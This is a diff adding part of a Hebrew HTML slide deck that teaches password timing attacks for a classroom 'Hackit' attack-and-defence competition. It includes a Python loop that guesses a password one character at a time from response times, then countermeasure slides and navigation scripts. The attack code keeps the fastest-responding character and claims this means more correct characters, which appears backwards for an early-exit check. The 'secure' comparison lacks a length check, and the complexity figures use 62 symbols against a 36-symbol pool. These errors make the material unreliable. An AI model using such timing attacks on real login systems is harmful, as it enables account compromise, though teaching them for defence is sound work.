+POOL = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>
+password = <span class="string">''</span>
+
+<span class="keyword">for</span> position <span class="keyword">in</span> range(len_pass):
+    times = {}
+    
+    <span class="comment"># נסה כל תו אפשרי</span>
+    <span class="keyword">for</span> char <span class="keyword">in</span> POOL:
+        test_pass = password + char + (<span class="string">'*'</span> * (len_pass - position - <span class="number">1</span>))
+        times[char] = timeit(build_url(test_pass), <span class="number">10</span>)
+    
+    <span class="comment"># מצא את התו עם הזמן המינימלי (הכי הרבה תווים נכונים)</span>
+    best_char = min(times, key=times.get)
+    password += best_char
+
+<span class="function">print</span>(<span class="string">f"Password found: {password}"</span>)</pre>
+                </div>
+
+                <div class="success-box">
+                    <strong>🎊 סיימנו!</strong> הסיסמה נחשפה באמצעות התקפת תזמון
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 13: Countermeasures -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>🛡️ אמצעי הגנה (Countermeasures)</h2>
+
+                <p style="font-size: 1.3em;">איך מונעים התקפות תזמון?</p>
+
+                <div class="two-columns">
+                    <div class="role-card">
+                        <h3>✅ קוד מאובטח</h3>
+                        <pre class="code-block" style="margin: 15px 0; font-size: 0.9em;">
+<span class="keyword">def</span> <span class="function">secureVerifyPassword</span>(inPass):
+    result = <span class="keyword">True</span>
+    
+    <span class="comment"># בדוק את כל התווים תמיד!</span>
+    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(password)):
+        <span class="keyword">if</span> inPass[i] != password[i]:
+            result = <span class="keyword">False</span>
+        <span class="comment"># ❌ אין break - תמשיך!</span>
+    
+    <span class="keyword">return</span> result</pre>
+                        <p><strong>עקרון:</strong> זמן קבוע לכל בדיקה</p>
+                    </div>
+                    <div class="role-card">
+                        <h3>🔐 טכניקות נוספות</h3>
+                        <ul style="text-align: right;">
+                            <li><strong>השוואת Hash:</strong> השווה hash במקום תווים</li>
+                            <li><strong>Rate Limiting:</strong> הגבלת מספר ניסיונות</li>
+                            <li><strong>רעש מלאכותי:</strong> הוספת זמן אקראי</li>
+                            <li><strong>CAPTCHA:</strong> אימות שאתה לא בוט</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3>🎯 השוואת מורכבות:</h3>
+                <div class="stats-box">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; text-align: center;">
+                        <div>
+                            <strong>Brute Force</strong><br>
+                            62^n אפשרויות<br>
+                            סיסמה באורך 8 = 218 טריליון
+                        </div>
+                        <div style="border-right: 2px solid white; padding-right: 20px;">
+                            <strong>Timing Attack</strong><br>
+                            n × 62 ניסיונות<br>
+                            סיסמה באורך 8 = 496 בלבד!
+                        </div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <strong>💭 למה זה קריטי?</strong> ההבדל הוא עצום! מ-218 טריליון ל-496 ניסיונות.
+                    זו הסיבה שקוד מאובטח חייב להיות constant-time.
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 14: Hackit Competition -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="game-section">
+                    <h1 style="color: white; font-size: 3em;">🎮 תחרות Hackit</h1>
+                    <p style="font-size: 1.4em; margin: 20px 0;">כעת, הגיע הזמן ליישם את מה שלמדתם!</p>
+                </div>
+
+                <div class="two-columns" style="margin-top: 30px;">
+                    <div class="role-card">
+                        <h2 style="color: #dc3545;">🔴 תפקיד: תוקף</h2>
+                        <h3>המשימה שלכם:</h3>
+                        <ul style="text-align: right;">
+                            <li>כתבו אלגוריתם פריצה יעיל</li>
+                            <li>השתמשו במדידות זמן מדויקות</li>
+                            <li>יישמו סטטיסטיקה לזיהוי תווים</li>
+                            <li>טפלו בחריגים ורעשים</li>
+                            <li>נסו לפצח מהר ככל האפשר</li>
+                        </ul>
+                        <div class="stats-box" style="background: linear-gradient(135deg, #ff6b6b 0%, #c92a2a 100%);">
+                            ניקוד: מהירות + דיוק
+                        </div>
+                    </div>
+                    <div class="role-card">
+                        <h2 style="color: #28a745;">🟢 תפקיד: מגן</h2>
+                        <h3>המשימה שלכם:</h3>
+                        <ul style="text-align: right;">
+                            <li>בנו שרת עם פרצת תזמון מתוחכמת</li>
+                            <li>הוסיפו השהיות אסטרטגיות</li>
+                            <li>צרו רעש שמקשה על הפריצה</li>
+                            <li>שמרו על חוקי המשחק</li>
+                            <li>נסו להאריך את זמן הפריצה</li>
+                        </ul>
+                        <div class="stats-box" style="background: linear-gradient(135deg, #51cf66 0%, #2b8a3e 100%);">
+                            ניקוד: זמן עמידה
+                        </div>
+                    </div>
+                </div>
+
+                <h3 style="margin-top: 40px; text-align: center; font-size: 1.5em;">🎯 מטרת המשחק</h3>
+                <ul style="font-size: 1.2em;">
+                    <li>חשיבה דו-צדדית: להבין גם תקיפה וגם הגנה</li>
+                    <li>יישום מעשי של תיאוריה קריפטוגרפית</li>
+                    <li>פיתוח חשיבה אלגוריתמית מתקדמת</li>
+                    <li>עבודת צוות ופתרון בעיות יצירתי</li>
+                </ul>
+
+                <div class="success-box" style="margin-top: 30px; font-size: 1.2em;">
+                    <strong>🏆 בהצלחה!</strong> זכרו: המשחק הוא על האיזון בין תקיפה להגנה.
+                    <br>הצד שמבין טוב יותר את הצד השני - מנצח!
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 15: Summary -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>📚 סיכום</h2>
+                
+                <div style="display: grid; gap: 20px;">
+                    <div class="role-card">
+                        <h3>🔍 למדנו:</h3>
+                        <ul style="text-align: right; font-size: 1.1em;">
+                            <li><strong>התקפות ערוץ צדדי:</strong> ניצול מידע שולי מהמערכת</li>
+                            <li><strong>Timing Attacks:</strong> מדידת זמני תגובה לחשיפת סודות</li>
+                            <li><strong>סטטיסטיקה:</strong> ממוצע, סטיית תקן, זיהוי חריגים</li>
+                            <li><strong>אלגוריתם פריצה:</strong> מציאת אורך + מציאת תווים</li>
+                            <li><strong>אמצעי הגנה:</strong> constant-time, rate limiting</li>
+                        </ul>
+                    </div>
+
+                    <div class="role-card">
+                        <h3>💡 נקודות מפתח:</h3>
+                        <ul style="text-align: right; font-size: 1.1em;">
+                            <li>הבדלים קטנים בזמן → מידע גדול</li>
+                            <li>מדידות חוזרות מפחיתות רעש</li>
+                            <li>סטיית תקן עוזרת למצוא חריגים</li>
+                            <li>O(n×m) הרבה יותר טוב מ-O(mⁿ)</li>
+                            <li>הגנה = זמן קבוע לכל פעולה</li>
+                        </ul>
+                    </div>
+
+                    <div class="game-section">
+                        <h2 style="color: white;">🚀 מוכנים לתחרות?</h2>
+                        <p style="font-size: 1.3em; margin: 20px 0;">
+                            עכשיו אתם מצוידים בכלים להצליח ב-Hackit!
+                        </p>
+                        <p style="font-size: 1.2em;">
+                            ⚔️ תוקפים - פתחו אלגוריתם חכם<br>
+                            🛡️ מגנים - בנו שרת מאתגר<br>
+                            🏆 כולם - למדו ותהנו!
+                        </p>
+                    </div>
+                </div>
+
+                <div class="stats-box" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-size: 1.4em; margin-top: 30px;">
+                    זכרו: הבנת הצד השני היא המפתח להצלחה! 🔑
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="navigation">
+        <button class="nav-btn" onclick="previousSlide()">⏭️ הקודם</button>
+        <button class="nav-btn" onclick="nextSlide()">הבא ⏮️</button>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+
+        function showSlide(n) {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (n + totalSlides) % totalSlides;
+            slides[currentSlide].classList.add('active');
+            updateCounter();
+            updateProgress();
+            
+            // Scroll to top of the page when changing slides
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        }
+
+        function nextSlide() {
+            showSlide(currentSlide + 1);
+        }
+
+        function previousSlide() {
+            showSlide(currentSlide - 1);
+        }
+
+        function updateCounter() {
+            document.getElementById('slideCounter').textContent = `${currentSlide + 1} / ${totalSlides}`;
+        }
+
+        function updateProgress() {
+            const progress = ((currentSlide + 1) / totalSlides) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === 'ArrowLeft') {
+                e.preventDefault();
+                if (e.key === 'ArrowRight') previousSlide(); // RTL
+                else nextSlide();
+            }
+        });
+
+        // Interactive functions
+        function calculateMean() {
+            const input = document.getElementById('meanInput').value;
+            const numbers = input.split(',').map(x => parseFloat(x.trim())).filter(x => !isNaN(x));
+            
+            if (numbers.length === 0) {
+                document.getElementById('meanOutput').innerHTML = '<span style="color: red;">נא להכניס מספרים תקינים</span>';
+                return;
+            }
+            
+            const sum = numbers.reduce((a, b) => a + b, 0);
+            const mean = sum / numbers.length;
+            
+            document.getElementById('meanOutput').innerHTML = `
+                <strong>המספרים:</strong> ${numbers.join(', ')}<br>
+                <strong>סכום:</strong> ${sum.toFixed(4)}<br>
+                <strong>כמות:</strong> ${numbers.length}<br>
+                <strong>ממוצע:</strong> <span style="color: green; font-size: 1.3em;">${mean.toFixed(4)}</span>
+            `;
+        }
+
+        function calculateStd() {
+            const input = document.getElementById('stdInput').value;
+            const numbers = input.split(',').map(x => parseFloat(x.trim())).filter(x => !isNaN(x));
+            
+            if (numbers.length === 0) {
+                document.getElementById('stdOutput').innerHTML = '<span style="color: red;">נא להכניס מספרים תקינים</span>';
+                return;
+            }
+            
+            const sum = numbers.reduce((a, b) => a + b, 0);
+            const mean = sum / numbers.length;
+            const squaredDiffs = numbers.map(x => Math.pow(x - mean, 2));
+            const variance = squaredDiffs.reduce((a, b) => a + b, 0) / numbers.length;
+            const std = Math.sqrt(variance);
+            
+            document.getElementById('stdOutput').innerHTML = `
+                <strong>המספרים:</strong> ${numbers.join(', ')}<br>
+                <strong>ממוצע:</strong> ${mean.toFixed(4)}<br>
+                <strong>שונות:</strong> ${variance.toFixed(4)}<br>
+                <strong>סטיית תקן:</strong> <span style="color: green; font-size: 1.3em;">${std.toFixed(4)}</span><br>
+                <br>
+                <strong>פרשנות:</strong> רוב הערכים נמצאים בטווח ${(mean - std).toFixed(4)} עד ${(mean + std).toFixed(4)}
+            `;
+        }
+
+        // Initialize
+        updateCounter();
+        updateProgress();
+    </script>
+</body>
+</html>
